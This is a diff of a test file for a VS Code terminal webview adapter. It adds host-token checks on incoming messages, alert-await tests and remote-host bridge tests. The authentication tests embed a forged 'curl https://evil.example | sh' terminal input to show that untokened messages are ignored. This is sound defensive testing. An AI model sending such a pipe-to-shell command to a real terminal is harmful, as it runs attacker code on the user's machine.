@@ -27,35 +27,56 @@ import {
   collectTerminalSemanticEvents,
   TerminalProtocolParser,
 } from '../terminal-protocol';
+import { HOST_MESSAGE_TOKEN_FIELD, HOST_MESSAGE_TOKEN_GLOBAL } from '../vscode-message-token';
 import { VSCodeAdapter } from './vscode-adapter';
 
-describe('VSCodeAdapter PTY exit handling', () => {
-  let windowTarget: EventTarget;
-  let postMessage: ReturnType<typeof vi.fn>;
+/** Stand-in for the per-boot token the extension host injects at webview boot. */
+const HOST_TOKEN = 'test-host-message-token';
 
-  beforeEach(() => {
-    windowTarget = new EventTarget();
-    postMessage = vi.fn();
-    terminalThemeMocks.listeners.clear();
-    terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' });
-    class TestCustomEvent<T = unknown> extends Event {
-      readonly detail: T;
-
-      constructor(type: string, eventInitDict?: CustomEventInit<T>) {
-        super(type, eventInitDict);
-        this.detail = eventInitDict?.detail as T;
-      }
-
-      initCustomEvent(): void {}
-    }
-    vi.stubGlobal('window', windowTarget);
-    vi.stubGlobal('CustomEvent', TestCustomEvent);
-    vi.stubGlobal('acquireVsCodeApi', () => ({
-      postMessage,
-      getState: vi.fn(),
-      setState: vi.fn(),
-    }));
+/**
+ * Build the `message` event the extension host would post: the payload plus the
+ * token stamp `serveWebview`'s channel adds. Framed content can't read the
+ * token, so a forged message is just this without the stamp.
+ */
+function hostMessage(data: Record<string, unknown>, token: unknown = HOST_TOKEN): MessageEvent {
+  return new MessageEvent('message', {
+    data: { ...data, [HOST_MESSAGE_TOKEN_FIELD]: token },
   });
+}
+
+let windowTarget: EventTarget;
+let postMessage: ReturnType<typeof vi.fn>;
+
+/** The globals the adapter captures at construction. Shared by the suites below. */
+function stubWebviewEnv(): void {
+  windowTarget = new EventTarget();
+  postMessage = vi.fn();
+  terminalThemeMocks.listeners.clear();
+  terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' });
+  class TestCustomEvent<T = unknown> extends Event {
+    readonly detail: T;
+
+    constructor(type: string, eventInitDict?: CustomEventInit<T>) {
+      super(type, eventInitDict);
+      this.detail = eventInitDict?.detail as T;
+    }
+
+    initCustomEvent(): void {}
+  }
+  vi.stubGlobal('window', windowTarget);
+  vi.stubGlobal('CustomEvent', TestCustomEvent);
+  // The adapter captures this at construction, so it must be stubbed before
+  // any `new VSCodeAdapter()`.
+  vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, HOST_TOKEN);
+  vi.stubGlobal('acquireVsCodeApi', () => ({
+    postMessage,
+    getState: vi.fn(),
+    setState: vi.fn(),
+  }));
+}
+
+describe('VSCodeAdapter PTY exit handling', () => {
+  beforeEach(stubWebviewEnv);
 
   afterEach(() => {
     vi.unstubAllGlobals();
@@ -67,9 +88,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
     const exits: Array<{ id: string; exitCode: number }> = [];
     adapter.onPtyExit((detail) => exits.push(detail));
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: { type: 'pty:exit', id: 'pane-1', exitCode: 7 },
-    }));
+    windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));
 
     expect(exits).toEqual([{ id: 'pane-1', exitCode: 7 }]);
     expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
@@ -146,14 +165,54 @@ describe('VSCodeAdapter PTY exit handling', () => {
     });
   });
 
+  // The AlertManager lives in the extension host, so `dor await` parks there
+  // and only the outcome crosses back (docs/specs/alert.md → Await).
+  it('parks an await in the extension host and settles it from the result message', async () => {
+    const adapter = new VSCodeAdapter();
+
+    const handle = adapter.alertAwait('pane-1', { until: 'quiet', timeoutMs: 600_000 });
+    const [request] = postMessage.mock.calls[0] as [{ type: string; requestId: string }];
+    expect(request).toMatchObject({
+      type: 'alert:await',
+      id: 'pane-1',
+      until: 'quiet',
+      timeoutMs: 600_000,
+    });
+
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'alert:awaitResult',
+      requestId: request.requestId,
+      outcome: { kind: 'resolved', cause: 'quiet', waitedMs: 12_345 },
+    }));
+
+    expect(await handle.promise).toEqual({ kind: 'resolved', cause: 'quiet', waitedMs: 12_345 });
+  });
+
+  it('asks the host to cancel and still takes the outcome from the result message', async () => {
+    const adapter = new VSCodeAdapter();
+
+    const handle = adapter.alertAwait('pane-1', { until: 'exit', timeoutMs: 1_000 });
+    const [request] = postMessage.mock.calls[0] as [{ requestId: string }];
+    handle.cancel();
+
+    expect(postMessage).toHaveBeenCalledWith({ type: 'alert:awaitCancel', requestId: request.requestId });
+
+    // The host answers the cancel through the same channel, so a claim is never
+    // released locally and then again remotely.
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'alert:awaitResult',
+      requestId: request.requestId,
+      outcome: { kind: 'cancelled', waitedMs: 40 },
+    }));
+    expect(await handle.promise).toEqual({ kind: 'cancelled', waitedMs: 40 });
+  });
+
   it('forwards the host canonical watched-command snapshot', () => {
     const adapter = new VSCodeAdapter();
     const snapshots: string[][] = [];
     adapter.onWatchedCommands((names) => snapshots.push(names));
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: { type: 'alert:watchedCommands', names: ['claude', 'npm'] },
-    }));
+    windowTarget.dispatchEvent(hostMessage({ type: 'alert:watchedCommands', names: ['claude', 'npm'] }));
 
     expect(snapshots).toEqual([['claude', 'npm']]);
   });
@@ -163,12 +222,10 @@ describe('VSCodeAdapter PTY exit handling', () => {
     const replays: Array<{ id: string; data: string }> = [];
     adapter.onPtyReplay((detail) => replays.push(detail));
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: {
-        type: 'pty:replay',
-        id: 'pane-1',
-        data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
-      },
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'pty:replay',
+      id: 'pane-1',
+      data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
     }));
 
     // Visible data is stripped of the OSC 7 sequence.
@@ -192,9 +249,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
       { type: 'promptStart' as const },
     ];
 
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: { type: 'terminal:semanticEvents', id: 'pane-1', events },
-    }));
+    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:semanticEvents', id: 'pane-1', events }));
     void adapter;
 
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledTimes(1);
@@ -223,7 +278,7 @@ describe('VSCodeAdapter PTY exit handling', () => {
     }));
 
     new VSCodeAdapter();
-    windowTarget.dispatchEvent(new MessageEvent('message', { data: wirePayload }));
+    windowTarget.dispatchEvent(hostMessage(wirePayload));
 
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledTimes(1);
     expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).toHaveBeenCalledWith('pane-1', hostEvents);
@@ -236,15 +291,13 @@ describe('VSCodeAdapter PTY exit handling', () => {
     });
 
     new VSCodeAdapter();
-    windowTarget.dispatchEvent(new MessageEvent('message', {
-      data: {
-        type: 'dormouse:newTerminal',
-        shell: '/bin/zsh',
-        args: ['-l'],
-        name: 'zsh',
-        replaceUntouched: true,
-        announce: true,
-      },
+    windowTarget.dispatchEvent(hostMessage({
+      type: 'dormouse:newTerminal',
+      shell: '/bin/zsh',
+      args: ['-l'],
+      name: 'zsh',
+      replaceUntouched: true,
+      announce: true,
     }));
 
     expect(requests).toEqual([{
@@ -254,5 +307,216 @@ describe('VSCodeAdapter PTY exit handling', () => {
       replaceUntouched: true,
       announce: true,
     }]);
+  });
+
+  // "Arrived as a message event" is not evidence the extension host sent it.
+  // See ../vscode-message-token.ts.
+  describe('host message authentication', () => {
+    /** What framed content can produce: the right shape, no token. */
+    function forgedMessage(data: Record<string, unknown>): MessageEvent {
+      return new MessageEvent('message', { data });
+    }
+
+    const controlRequest = {
+      type: 'dor:controlRequest',
+      requestId: 'forged-1',
+      surfaceId: 'pane-1',
+      method: 'surface.send',
+      params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
+    };
+
+    it('ignores a control request that does not carry the host token', () => {
+      const dispatched: unknown[] = [];
+      windowTarget.addEventListener('dormouse:control-request', (event) => {
+        dispatched.push((event as CustomEvent).detail);
+      });
+
+      new VSCodeAdapter();
+      windowTarget.dispatchEvent(forgedMessage(controlRequest));
+
+      // No control request reaches use-dor-control, so nothing becomes a PTY
+      // write, and nothing is echoed back to the host.
+      expect(dispatched).toEqual([]);
+      expect(postMessage).not.toHaveBeenCalled();
+    });
+
+    it('processes the same control request when it carries the host token', () => {
+      const dispatched: Array<{ method: string; params: unknown }> = [];
+      windowTarget.addEventListener('dormouse:control-request', (event) => {
+        dispatched.push((event as CustomEvent).detail);
+      });
+
+      new VSCodeAdapter();
+      windowTarget.dispatchEvent(hostMessage(controlRequest));
+
+      expect(dispatched).toHaveLength(1);
+      expect(dispatched[0]).toMatchObject({
+        method: 'surface.send',
+        params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
+      });
+    });
+
+    it('ignores untokened pty traffic, so framed content cannot spoof terminal state', () => {
+      const adapter = new VSCodeAdapter();
+      const data: unknown[] = [];
+      const replays: unknown[] = [];
+      const exits: unknown[] = [];
+      const lists: unknown[] = [];
+      adapter.onPtyData((detail) => data.push(detail));
+      adapter.onPtyReplay((detail) => replays.push(detail));
+      adapter.onPtyExit((detail) => exits.push(detail));
+      adapter.onPtyList((detail) => lists.push(detail));
+
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:data', id: 'pane-1', data: 'fake' }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:replay', id: 'pane-1', data: 'fake' }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 0 }));
+      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:list', ptys: [] }));
+      windowTarget.dispatchEvent(forgedMessage({
+        type: 'terminal:semanticEvents', id: 'pane-1', events: [{ type: 'promptStart' }],
+      }));
+
+      expect(data).toEqual([]);
+      expect(replays).toEqual([]);
+      expect(exits).toEqual([]);
+      expect(lists).toEqual([]);
+      expect(terminalStateStoreMocks.applyTerminalSemanticEventsByPtyId).not.toHaveBeenCalled();
+    });
+
+    it('rejects a wrong token as firmly as a missing one', () => {
+      const adapter = new VSCodeAdapter();
+      const exits: unknown[] = [];
+      adapter.onPtyExit((detail) => exits.push(detail));
+
+      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }, 'guessed'));
+
+      expect(exits).toEqual([]);
+    });
+
+    it('guards request/response replies too, so a forged reply cannot beat the real one', async () => {
+      const adapter = new VSCodeAdapter();
+      const pending = adapter.getCwd('pane-1');
+
+      const [request] = postMessage.mock.calls[0] as [{ requestId: string }];
+
+      // A forged reply matching type and requestId, racing ahead of the host's.
+      windowTarget.dispatchEvent(forgedMessage({
+        type: 'pty:cwd', id: 'pane-1', cwd: '/attacker', requestId: request.requestId,
+      }));
+      windowTarget.dispatchEvent(hostMessage({
+        type: 'pty:cwd', id: 'pane-1', cwd: '/real/project', requestId: request.requestId,
+      }));
+
+      expect(await pending).toBe('/real/project');
+    });
+
+    it('accepts nothing when the host injected no token', () => {
+      // A webview served without the global fails closed rather than open.
+      vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, undefined);
+      const adapter = new VSCodeAdapter();
+      const exits: unknown[] = [];
+      adapter.onPtyExit((detail) => exits.push(detail));
+
+      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));
+
+      expect(exits).toEqual([]);
+    });
+  });
+});
+
+
+// The remote Host lives in the extension host, in whichever VS Code window won
+// the bind (vscode-ext/src/remote-host.ts). This is the webview's end of that
+// bridge; the contract is lib/src/host/remote/service-protocol.ts.
+//
+// Only what this transport adds is covered here: which message carries what,
+// and the host-token guard in front of all of it. The correlation, timeout,
+// always-answer, and dispose rules are the shared client's
+// (lib/src/host/remote/link-client.test.ts).
+describe('VSCodeAdapter remote host link', () => {
+  beforeEach(stubWebviewEnv);
+
+  afterEach(() => {
+    vi.unstubAllGlobals();
+    vi.clearAllMocks();
+  });
+
+  /** Every `remoteHost:command` this adapter has posted, in order. */
+  function sent(): Array<{ rhId: string; cmd: string; params?: unknown }> {
+    return postMessage.mock.calls
+      .map((call) => call[0])
+      .filter((message) => message.type === 'remoteHost:command')
+      .map((message) => message.payload);
+  }
+
+  function deliver(data: Record<string, unknown>): void {
+    windowTarget.dispatchEvent(hostMessage(data));
+  }
+
+  it('posts a command and settles it from the result message', async () => {
+    const adapter = new VSCodeAdapter();
+    const pending = adapter.remoteHost.command('status');
+
+    const payload = sent()[0]!;
+    expect(payload.cmd).toBe('status');
+    deliver({ type: 'remoteHost:result', payload: { rhId: payload.rhId, result: { enrolled: true } } });
+
+    expect(await pending).toEqual({ enrolled: true });
+  });
+
+  it('answers an ask from the registered responder', () => {
+    const adapter = new VSCodeAdapter();
+    adapter.remoteHost.respond('surfaceOp', (params) => [
+      { ptyId: 'pty-1', ...(params as Record<string, unknown>) },
+    ]);
+
+    deliver({ type: 'peer:ask', requestId: 'ask-1', op: 'surfaceOp', params: { surfaceId: 's1' } });
+
+    expect(postMessage).toHaveBeenCalledWith({
+      type: 'peer:answer',
+      requestId: 'ask-1',
+      results: [{ ptyId: 'pty-1', surfaceId: 's1' }],
+    });
+  });
+
+  it('fans an extension-host event out by name', () => {
+    const adapter = new VSCodeAdapter();
+    const seen: unknown[] = [];
+    adapter.remoteHost.on('pairing-queue', (data) => void seen.push(data));
+
+    deliver({ type: 'remoteHost:event', payload: { name: 'pairing-queue', queue: [{ clientId: 'c1' }] } });
+    expect(seen).toEqual([{ name: 'pairing-queue', queue: [{ clientId: 'c1' }] }]);
+  });
+
+  it('notifies without waiting for anything', () => {
+    const adapter = new VSCodeAdapter();
+    adapter.remoteHost.notify();
+    expect(postMessage).toHaveBeenCalledWith({ type: 'peer:notify' });
+  });
+
+  it('rejects what is still in flight when the webview shuts down', async () => {
+    // The extension host cleans up the PTYs, but nothing there will ever answer
+    // a command this webview is still holding.
+    const adapter = new VSCodeAdapter();
+    const pending = adapter.remoteHost.command('status');
+    adapter.shutdown();
+    await expect(pending).rejects.toThrow('remote host bridge closed');
+  });
+
+  it('ignores an unauthenticated result, so framed content cannot settle a command', async () => {
+    const adapter = new VSCodeAdapter();
+    vi.useFakeTimers();
+    try {
+      const pending = adapter.remoteHost.command('status');
+      const rejected = expect(pending).rejects.toThrow(/timed out/);
+      windowTarget.dispatchEvent(
+        new MessageEvent('message', {
+          data: { type: 'remoteHost:result', payload: { rhId: sent()[0]!.rhId, result: 'forged' } },
+        }),
+      );
+      await vi.advanceTimersByTimeAsync(20_000);
+      await rejected;
+    } finally {
+      vi.useRealTimers();
+    }
   });
 });
